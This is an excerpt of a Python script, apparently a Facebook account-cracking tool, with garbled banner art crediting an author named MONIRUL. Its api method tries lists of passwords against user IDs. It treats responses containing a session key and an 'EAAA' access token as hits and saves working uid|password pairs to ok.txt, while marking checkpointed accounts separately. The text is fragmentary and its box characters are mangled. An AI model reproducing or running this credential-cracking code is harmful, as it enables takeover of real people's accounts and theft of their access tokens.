...
\033[1;93m   .........................................
    ...
    鈹� [鉁揮 AUTHOR   : MONIRUL            鈹�
    鈹� [鉁揮 FACEBOOK : MD MARUF AHMED        鈹�
    鈹� [鉁揮 WHATSAPP : 01972852830        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mMONIRUL\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		print("\033[92;1m        AUTHOR : MONIRUL-XD      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/valo.basa.top10.monir')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " MONIR): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[MONIR馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MONIR-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" OK] %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MONIR-CP馃樋] %s|%s\033[0;97m         "%(uid, pw))
